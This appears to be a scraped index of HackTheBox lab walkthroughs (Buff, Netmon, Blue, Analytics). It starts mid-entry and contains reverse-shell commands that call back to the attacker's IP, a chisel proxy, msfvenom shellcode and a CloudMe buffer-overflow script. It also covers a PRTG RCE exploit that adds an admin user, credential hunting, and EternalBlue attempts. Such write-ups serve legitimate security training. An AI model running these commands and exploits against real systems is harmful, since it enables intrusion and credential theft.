# On attacker box: sudo ufw allow from $RADDR to any port 4445 proto tcp rlwrap socat TCP4-LISTEN:4445,fork STDOUT # On target box: curl -o C:\\Users\\shaun\\Downloads\\nc.exe http://10.10.14.9:8000/nc.exe C:\\Users\\shaun\\Downloads\\nc.exe 10.10.14.9 4445 -e powershell.exe &#x261d;&#xfe0f; Using rlwrap allows for things like command history (up/down arrow)
Ok, that downloaded netcat and created the Powershell reverse shell; now I&rsquo;ll download chisel:
(New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.9:8000/chisel.exe&#39;,&#39;C:\\Users\\shaun\\Downloads\\chisel2.exe&#39;) Looks like it was successful:
Success - we got chisel onto the target using two different methods. Time to make the proxy using chisel and run the exploit.
Forming the proxy On the attacker box, open the firewall and run chisel:
sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse &#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 Then, using the powershell reverse shell (but should also be the same from the cmd webshell):
.\\chisel.exe client 10.10.14.9:9999 R:1080:socks Just to check my work, I&rsquo;ll do a round-trip test and contact my own python http server:
Running the exploit A few of the exploits that showed up in the searchsploit results were simply PoC code. For those, I&rsquo;ll have to generate new shellcode and put that into the PoC to have it actually exploit the target in a meaningful way. To do this requires a call to msfvenom for creating a new reverse shell:
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4446 -b &#39;\\x00\\x0A\\x0D&#39; -f python Using exploit with EDB-ID 48389 as a base, I&rsquo;ll put the generated shellcode inside:
import socket target = &#34;127.0.0.1&#34; padding1 = b&#34;\\x90&#34; * 1052 EIP = b&#34;\\xB5\\x42\\xA8\\x68&#34; # 0x68A842B5 -&gt; PUSH ESP, RET NOPS = b&#34;\\x90&#34; * 30 # copy your shellcode in here: buf = b&#34;&#34; buf += b&#34;\\xba\\x8b\\x88\\xe7\\x27\\xd9\\xed\\xd9\\x74\\x24\\xf4\\x5e&#34; # ...snip... buf += b&#34;\\xee\\xef\\x61\\x47\\x5d\\x0f\\xa0\\x24\\x0c\\x8b\\x65\\xcf&#34; buf += b&#34;\\xb6\\x36\\x7a&#34; payload = buf overrun = b&#34;C&#34; * (1500 - len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value) Credit to the PoC code goes to: CloudMe 1.11.2 - Buffer Overflow (PoC) Date: 2020-04-27 Exploit Author: Andy Bowden
Now, use the proxy to finally exploit CloudMe:
# open the firewall sudo ufw allow from $RADDR to any port 4446 proto tcp # start a listener nc -lvnp 4446 # in another tab, launch the exploit proxychains python2 ./48389-edited.py Finally, a root shell:
&#x1f389; Now just type out the flag
LESSONS LEARNED Attacker Use Powershell when possible, even if you have a fairly functional cmd shell. It&rsquo;s not essential, but it&rsquo;ll help you move a lot faster. Check for listening processes and tasklist in the same command. I noticed that the PIDs were changing rapidly on this box, and as a result, it was hard to determine exactly what was listening on port 8888. Once I combined the two commands into a one-liner, the identity of the listening process became apparent. Don&rsquo;t be afraid to generate shellcode. Msfvenom may seem a bit intimidating to use, but it does what it does very well. If you can&rsquo;t figure out what payload to use, simply popping a new reverse shell is an excellent option. Defender Use well-known software. On this box, the website was running a web app that seems like it was developed by one (maybe two) people. There are tons of more popular, free options out there - options that attract many bug-hunters&rsquo; eyes. when faced with an option like this, always choose the more battle-hardened software.
Use automatic updates. Avoid CVEs. Better yet, use a CI/CD pipeline that will prevent you from &ldquo;shooting your own foot&rdquo;. Nowadays, even just using Github is enough: it&rsquo;ll raise many alarms if your code is vulnerable to well-known CVEs.
`,url:"https://4wayhandshake.github.io/walkthrough/buff/"},"https://4wayhandshake.github.io/walkthrough/netmon/":{title:"Netmon",tags:["PRTG Network Monitor","FTP","Grep","CVE"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Netmon is the second Windows box in my &ldquo;Let&rsquo;s brush up on Windows!&rdquo; series. For the previous one, see my walkthrough on Blue. This box revolves around a network monitoring tool called PRTG. It&rsquo;s very easy, and a great reintroduction to Windows tools. Recon leads straight into the user flag, skipping any necessity of acquiring a foothold.
If recon was done properly, there are only a few options to follow when seeking the root flag. Thankfully, these options have very few rabbit-holes. Keep it simple, don&rsquo;t dig in your heels on any particular method, and you&rsquo;ll find yourself in possession of the root flag in no time at all! Just remember: while software and vulnerabilities change all the time, human habits are much less volatile.
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Host is up (0.061s latency). Not shown: 65522 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-02-19 11:18PM 1024 .rnd | 02-25-19 09:15PM &lt;DIR&gt; inetpub | 07-16-16 08:18AM &lt;DIR&gt; PerfLogs | 02-25-19 09:56PM &lt;DIR&gt; Program Files | 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86) | 02-03-19 07:08AM &lt;DIR&gt; Users |_11-10-23 09:20AM &lt;DIR&gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-trane-info: Problem with XML parsing of /evox/about |_http-server-header: PRTG/18.1.37.13946 | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Nice, there&rsquo;s anonymous-login FTP and a webserver, among other things. The webserver is running an application called PRTG Network Monitor 18.1.37.13946. Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -sV -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) | http-vuln-cve2010-0738: |_ /jmx-console/: Authentication was not required |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Finally, just to be thorough, I&rsquo;ll start a UDP scan and let it run while I continue:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 9/udp open|filtered tcpwrapped 123/udp open|filtered ntp 137/udp open|filtered netbios-ns 138/udp open|filtered tcpwrapped 177/udp open|filtered xdmcp 500/udp open|filtered isakmp 520/udp open|filtered route 3456/udp open|filtered tcpwrapped 4500/udp open|filtered tcpwrapped 5353/udp open|filtered zeroconf 32815/udp open|filtered unknown 49152/udp open|filtered unknown 49181/udp open|filtered unknown 49185/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
USER FLAG Anonymous FTP On an Easy box, having an anonymous FTP login is usually a very good place to start. Sometimes it&rsquo;s a rabbit-hole, but often enough it will indicate what the next step on the box is. Let&rsquo;s log in and investigate. When prompted, use username &ldquo;anonymous&rdquo; and a blank password:
ftp $RADDR cd Users dir # note the Public folder cd Public/Desktop dir # note the user flag sitting right there get user.txt exit # quit out of FTP ----------- # Read the flag: cat user.txt &#x1f370; Wow, that was super easy!
ROOT FLAG CVE-2010-0738 &#x26a0;&#xfe0f; This part did not lead to a meaningful result. If you&rsquo;re short on time, skip this part of the walkthrough.
The vulnerability scan above shows that the target might be vulnerable to CVE-2010-0738, a flaw in the HTTP server. According to the NIST CVE entry, the webserver &ldquo;performs access control only for the GET and POST methods, which allows remote attackers to send requests to this application&rsquo;s GET handler by using a different method.&rdquo;. A quick search turned up a tool called jboss-autopwn that claims to exploit this CVE into a reverse shell.
Reading through the Windows exploit, e2.sh, it looks like the exploit uses the vulnerability to upload a malicious .war file to the JMX-console. The .war file creates a webshell at /browserwin/browser/Browser.jsp. Then, depending on which way you want to get a connection, the webshell is used to upload a bind shell or reverse shell.
Let&rsquo;s clone the repo and try it out. First, prepare a listener:
# open a port in the firewall sudo ufw allow from $RADDR to any port 4444 proto tcp rlwrap nc -lvnp 4444 chmod +x e2.sh ./e2.sh $RADDR 80 Looks like it failed (and my listener did not receive any connection). However, it&rsquo;s clear why it failed: I&rsquo;m pretty sure that, since 2010, msfpayload has actually been recreated as msfvenom. Plus, the real secret sauce of the exploit is the part that uploads the webshell, and that part succeeded. I&rsquo;ll try modifying the exploit to use msfvenom instead of msfpayload:
With that change made, I&rsquo;ll try running again:
&#x1f914; Hmm&hellip; still failed. Well, at least it generated the payload properly this time.
searchsploit I already checked the anonymous FTP, and CVE-2010-0738 didn&rsquo;t work; so what other leads do I have? Well, I have the full version number of the web application on port 80: PRTG Network Monitor 18.1.37.13946. Why not check searchsploit and see if there&rsquo;s an entry in ExploitDB?
searchsploit prtg --id Aha! There&rsquo;s an RCE exploit that will likely work on the version of PRTG that&rsquo;s running &#x1f601; I&rsquo;ll copy it over to my working directory and take a look.
There&rsquo;s a description of the exploit in the banner of the script:
&ldquo;*login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script. run the script to create a new user &lsquo;pentest&rsquo; in the administrators group with password &lsquo;P3nT3st!&rsquo;&rdquo;
Unfortunately the default credentials aren&rsquo;t valid. I&rsquo;ll look online and see if I can find out where the credentials might be stored.
Checking FTP again I spent some time investigating the PTRG thing, the application listening on port 80. I read through the Quick Start guide, which led me to the Configuration Backup knowledgebase article. Apparently, there should be a folder where PRTG stores all of its data:
Earlier when I checked FTP, I didn&rsquo;t see this folder. However, I didn&rsquo;t do a very thorough job - I more or less just grabbed the flag and ran! I&rsquo;ll check again:
ftp $RADDR # username &#34;anonymous&#34;, blank password dir -a # OH *facepalm* now I see! I had completely neglected to check for hidden files. Most importantly, there was a folder for PRTG within C:\\ProgramData
As soon as I saw them, I grabbed the three configuration files:
mget PRTG\\ Configuration.* # y, y, y exit I figured I would check these files for anything that might be a credential:
# Collection of words to grep for WORDS=\`locate grepstrings-basic.txt\` # Check the files for any of those words, output line numbers too grep -i -n -f $WORDS PRTG\\ Configuration.* This looks like it might be something:
Let&rsquo;s get the context of that one line:
grep -B 5 -A 5 prtgadmin PRTG\\ Configuration.old.bak Just what I needed! Looks like a credential is prtgadmin : PrTg@dmin2018. With any luck, it&rsquo;ll still be valid, and I can use it for the exploit I found earlier &#x1f44d;
Nope. I guess that credential isn&rsquo;t still valid. However, there&rsquo;s a year component to that password. This box was released in 2019 - I&rsquo;ll try an updated credential instead: prtgadmin : PrTg@dmin2019
Success! Now that I have a valid credential, I can try out that exploit that I found in searchsploit earlier. The details of the vulnerability and its exploit are described in this article.
Exploiting CVE-2018-9276 First, I&rsquo;ll copy over the exploit. It requires a cookie and credentials.
# Copy over the exploit searchsploit --path 46527 mkdir exploit; cd exploit cp /usr/share/exploitdb/exploits/windows/webapps/46527.sh . chmod +x 46527.sh To obtain the cookie, I&rsquo;ll proxy the login attempt through Burp:
GET /public/login.htm?loginurl=%2Fhome&amp;errormsg= HTTP/1.1 Host: 10.10.10.152 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Origin: http://10.10.10.152 DNT: 1 Connection: close Referer: http://10.10.10.152/home Cookie: OCTOPUS1813713946=ezgyQjU4MkFDLUM0OUItNDEyMi04NEY2LTQxMjJEMzYxOEMwRH0%3D Upgrade-Insecure-Requests: 1 Sec-GPC: 1 Now that I have the cookie, I&rsquo;ll adjust it into the format required for the exploit and run it:
./46527.sh -u http://10.10.10.152 -c &#34;OCTOPUS1813713946=e0I3MUI2MEZGLTIxQTQtNEIzRS1BQjMyLTE4NzNEODhGODhBQX0%3D; _gat=1&#34; Now apparently, there should be a new user in the Administrators group with credential pentest : P3nT3st!. There&rsquo;s no SSH on the box, but the initial port scan indicated TCP port 135 is listening, I&rsquo;ll try logging in using evil-winrm:
Perfect! This user should be in the Administrators group, so I&rsquo;ll try to grab the root flag now, from the C:\\Users\\Administrator directory that I couldn&rsquo;t access earlier:
cd ../../../Administrator/Desktop dir -a &#x1f352; And there it is. Obtain the flag using cat or type.
LESSONS LEARNED Attacker Check for hidden files in FTP. Even though it&rsquo;s not documented in the help text of FTP, there&rsquo;s often a -a flag that you can apply to be able to see hidden files and directories.
Passwords with years in them might be incremented. I&rsquo;ve seen passwords like this constantly at restaurants and hotels, ex. BestWestern2020. Always remember that people are inherently lazy and forgetful.
Defender Hidden files are not a safeguard. On this box, there were plaintext credentials in a backup file. That&rsquo;s not a good practice. Even if the credential is no longer valid, it still might reveal something about the password &ldquo;algorithm&rdquo; (in this case: keep the prefix and increment the year).
Disable anonymous FTP login. Better yet, just use SSH and proper key management. At worst, just use SFTP with proper credentials assigned.
`,url:"https://4wayhandshake.github.io/walkthrough/netmon/"},"https://4wayhandshake.github.io/walkthrough/blue/":{title:"Blue",tags:["Nmap","SMB","EternalBlue","Cmd","Wannacry"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Blue is a retired Windows box, the first box in my “Let’s brush up on Windows!” series. It ranks as one of the easiest Windows boxes. I&rsquo;m going to do a whole spree of boxes to try to brush up on my Windows technique. In the end, this box was more of an exercise in trying a whole bunch of exploits and dealing with really messed-up python environments.
tldr; If you&rsquo;re doing this box in 2024 or later, go straight to a more recent version of the exploit. After you finish Recon, just skip right to this part of the walkthrough.
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Nmap scan report for 10.10.10.40 Host is up (0.082s latency). Not shown: 65526 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=2/4%OT=135%CT=1%CU=31969%PV=Y%DS=2%DC=I%G=Y%TM=65BF OS:CC58%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S% OS:TS=7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5 OS:=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6= OS:2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O% OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF OS:=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=% OS:RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D OS:FI=N%T=80%CD=Z) I wonder what those six ports 49152-49157 are about. To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-02-04T17:43:58+00:00 | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required |_clock-skew: mean: 17s, deviation: 2s, median: 16s | smb2-time: | date: 2024-02-04T17:43:56 |_ start_date: 2024-02-04T17:25:52 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Oh, I think I already see where this is going&hellip; That&rsquo;s a very old version of Windows. If I recall correctly, this is even before EternalBlue - maybe the reason behind the name of the box? Let&rsquo;s check using nmap:
sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script vuln $RADDR Host script results: |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_smb-vuln-ms10-054: false Yup! It definitely looks like it&rsquo;s vulnerable to EternalBlue &#x1f44d;
Optional: Just to be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
All 100 scanned ports on 10.10.10.40 are in ignored states. Not shown: 73 closed udp ports (port-unreach), 27 open|filtered udp ports (no-response) The nmap vuln scan revealed that this box is vulnerable to MS17-010, AKA EternalBlue. If you&rsquo;re short on time, please feel free to skip the majority of the Foothold steps and go straight to the exploit that worked.
FOOTHOLD ExploitDB for EternalBlue I would like to challenge myself to not use Metasploit for this box. So, let&rsquo;s see if searchsploit has anything to say about using EternalBlue:
I&rsquo;ll start from the top, and try the RCE exploit listed first. I copied the exploit into my directory for the box, set up a Python venv, installed dependencies for the exploit, then ran it:
./42031.py I got some error about not being able to concatenate strings with bytes. This is most likely due to me using a different Python minor version than the exploit developer. I&rsquo;ll move on to the next exploit and try it instead.
Since there are other options available, I&rsquo;m not going to try to resolve this, and instead I&rsquo;ll first try the other exploits.
python3 42315.py # ModuleNotFoundError: No module named &#39;mysmb&#39; pip3 install mysmb # ERROR: Could not find a version that satisfies the requirement mysmb (from versions: none) # ERROR: No matching distribution found for mysmb Ok, so mysmb isn&rsquo;t in Pip, but thankfully, the exploit itself has a little note saying where to find it:
# EDB Note: mysmb.py can be found here ~ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py Alright, I&rsquo;ll download that and try it again:
curl -o mysmb.py https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py python3 42315.py Much better. Looks like I&rsquo;ll need to give it the IP address and a named pipe.
You may have seen a &ldquo;named pipe&rdquo; referred to as a FIFO. Its like a file that&rsquo;s only used as a buffer for data. They&rsquo;re made using the mkfifo command, a lot like you might touch a regular file.
Access denied, eh? I tried running it as root - same result. I&rsquo;ll read through the exploit and see if I missed something.
Ah I see, it requires a credential:
Finding a Credential One of the exposed ports on the box is 445, running SMB. In this case, it&rsquo;s SMB version 1 (hence, EternalBlue). I&rsquo;ve noticed that a lot of the time, anonymous login is available for it. Regardless, reading the nmap script scan above, we can see that the credential &ldquo;guest&rdquo; : &quot;&quot; should work.
smbclient -L //$RADDR # IPC$ # ADMIN$ # C$ # Users # Share Share was empty. I connected to Users using Thunar and poked around a bit. Didn&rsquo;t find any credential in there, though.
EternalBlue works by connecting to IPC$
A quick check with enum4linux -a $RADDR reveals that Administrator and guest are two accounts on the machine. We don&rsquo;t know what the administrator password is, so let&rsquo;s just use the guest SMB account.
Running EternalBlue For the life of me, I couldn&rsquo;t get any of the obvious exploits to actually run. Here are the ones I tried that I could not get working:
/usr/share/exploitdb/exploits/windows/remote/42031.py (from exploitdb) /usr/share/exploitdb/exploits/windows/remote/42315.py (from exploitdb) AutoBlue from https://github.com/3ndG4me/AutoBlue-MS17-010 eternalblue_exploit7.py from https://github.com/worawit/MS17-010 eternalblue_exploit7.py from https://github.com/TheJoyOfHacking/helviojunior-MS17-010, a fork of the above. I won&rsquo;t go into detail about what went wrong with each. tldr; none seemed to work with any modern python 3.
AutoBlue may have worked, but due to severe network issues on my end (really terrible internet connection) I could not get a reverse shell
Finally though, I found an exploit that did the trick quite nicely. It seems like it&rsquo;s based ont he worawit exploit mentioned above. It also took a couple of attempts for it to work, but I was able to get a reverse shell from the box:
Looks good. Here&rsquo;s the listener:
Yay! Finally I have a reverse shell, albeit an extremely fragile, laggy one.
USER &amp; ROOT FLAGS Obtain the flags from the usual locations
pwd # C:\\Windows\\system32 cd ../../Users This is a cmd shell, so use type to read the flags:
type haris\\Desktop\\user.txt type Administrator\\Desktop\\root.txt LESSONS LEARNED Attacker Nmap has lots more scripts than the defaults. When you use nmap -sC, it will only run the default scripts. There are a LOT more scripts than just those. Consider using the --script flag, ex. --script 'safe and vuln'
Use smbmap when you encounter SMB on port 445. It can yield some very good info.
enum4linux is another very easy tool to use, and is fast. Note that you can also run it with an expanded range of RIDs!
Defender Nobody in their right mind should run Windows 7 or 8. Did we learn nothing from Wannacry?
Disable SMBv1 if you absolutely must run Windows 7, 8, or 8.1. There is no reason to use SMBv1 in a production environment.
`,url:"https://4wayhandshake.github.io/walkthrough/blue/"},"https://4wayhandshake.github.io/walkthrough/analytics/":{title:"Analytics",tags:["Metabase","CVE","Docker Escape","SSH Keys","OverlayFS"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION At the time of writing this walkthrough, Analytics is still active. The box centers around a fictional analytics company that provides data analysis services using the infrastructure they&rsquo;re hosting. The company is running a popular open-source analytics / BI platform. This box uses a modern architecture, reflective of how real websites run these days (when they&rsquo;re on-prem).
For each step of Analytics, the skill emphasis is placed firmly on enumeration. Combining effective enumeration skills with some good research is well-rewarded at every step of this box. For this box, foothold, user, and root are each only a single step. Once you research the right things, it should all fall right into your lap. Have some fun with this one; use this opportunity to sharpen your enumeration toolset.
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Host is up (0.13s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://analytical.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
Not shown: 81 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 9/udp open|filtered tcpwrapped 53/udp open|filtered domain 68/udp open|filtered tcpwrapped 111/udp open|filtered rpcbind 177/udp open|filtered xdmcp 514/udp open|filtered tcpwrapped 515/udp open|filtered tcpwrapped 593/udp open|filtered tcpwrapped 626/udp open|filtered serialnumberd 1022/udp open|filtered tcpwrapped 1646/udp open|filtered tcpwrapped 4444/udp open|filtered tcpwrapped 17185/udp open|filtered wdbrpc 20031/udp open|filtered tcpwrapped 31337/udp open|filtered BackOrifice 32771/udp open|filtered sometimes-rpc6 49181/udp open|filtered unknown 49191/udp open|filtered unknown 49201/udp open|filtered unknown Note that these are open|filtered, so there&rsquo;s a very good chance these probes were simply dropped instead of actually open.
Webserver Strategy Noting the redirect from the nmap scan, I added analytical.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=analytical.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Nothing out of the ordinary there.
Next I performed vhost enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from the vhost scan. Now I’ll do a vhost scan, checking for subdomains of analytical.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/subdomain-$DOMAIN.md -of md -timeout 4 -ic -ac -v Just for good measure, I&rsquo;ll do a subdomain scan for http://analytical.htb:
ffuf -w $WLIST -u http://FUZZ.$DOMAIN -c -t 60 -o fuzzing/subdomain-$DOMAIN.md -of md -timeout 4 -ic -ac -v I&rsquo;m not sure why, but scanning for subdomains using the second method always goes much slower than the first method.
